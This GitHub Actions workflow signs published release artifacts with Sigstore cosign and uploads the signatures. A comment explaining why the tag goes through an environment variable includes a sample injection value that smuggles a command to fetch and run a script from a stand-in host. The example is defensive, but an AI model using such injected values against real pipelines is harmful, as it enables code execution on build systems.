# Sigstore Signing - Cryptographic signing for release artifacts
# https://docs.sigstore.dev/
# Signs your release artifacts using cosign (Sigstore), providing
# verifiable provenance and tamper-evidence for your releases.

name: Sign Release (Sigstore)

on:
  release:
    types: [published]

permissions:
  contents: write
  id-token: write  # Required for Sigstore OIDC

jobs:
  sign:
    name: Sign Release Artifacts
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1

      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6  # v4.1.2

      # The tag name goes through `env:`, never inline `${{ }}` in `run:`.
      # Actions expands `${{ }}` into the script *source* before any shell sees
      # it, so a tag like `v1$(curl evil.sh|sh)` becomes part of the command —
      # quoting cannot help, because the quotes are in the template, not around
      # the value. As an env var the tag is data: the shell expands `$TAG` to
      # its value and does not re-parse it.
      - name: Download release assets
        env:
          GH_TOKEN: ${{ github.token }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
        run: |
          mkdir -p release-assets
          gh release download "$RELEASE_TAG" -D release-assets

      - name: Sign each asset with cosign
        run: |
          for file in release-assets/*; do
            cosign sign-blob --yes "$file" \
              --output-signature "${file}.sig" \
              --output-certificate "${file}.pem"
          done

      - name: Upload signatures to release
        env:
          GH_TOKEN: ${{ github.token }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
        run: |
          gh release upload "$RELEASE_TAG" \
            release-assets/*.sig release-assets/*.pem
